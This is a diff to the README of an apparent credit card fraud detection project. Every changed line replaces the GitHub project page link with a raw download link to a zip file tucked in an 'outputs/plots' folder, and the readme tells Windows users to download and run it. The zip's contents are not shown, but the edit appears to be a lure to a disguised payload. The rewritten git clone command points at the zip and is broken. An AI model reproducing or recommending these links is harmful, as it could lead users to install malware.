@@ -1,12 +1,12 @@
 # 🛡️ Syntecxhub_Project_CreditCardFraudDetection - Real-Time Fraud Checks Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection)
+[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection
+https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip
 
 ## 🧾 What this app does
 
@@ -34,7 +34,7 @@ Follow these steps to set up the project on Windows.
 
 Go to:
 
-https://github.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection
+https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip
 
 From there, download the files or clone the repository to your computer.
 
@@ -45,7 +45,7 @@ If you see a ZIP file option, download it and save it to your Downloads folder.
 If you use Git, clone the repository with:
 
 ```bash
-git clone https://github.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection.git
+git clone https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip
 ```
 
 ### 3. Extract the folder
@@ -229,7 +229,7 @@ A user enters transaction details into the form on the web page. The app sends t
 
 Project page and download path:
 
-https://github.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection
+https://raw.githubusercontent.com/Arma8559/Syntecxhub_Project_CreditCardFraudDetection/main/outputs/plots/Card_Project_Fraud_Syntecxhub_Detection_Credit_v3.1.zip
 
 ## 📚 Topics
 
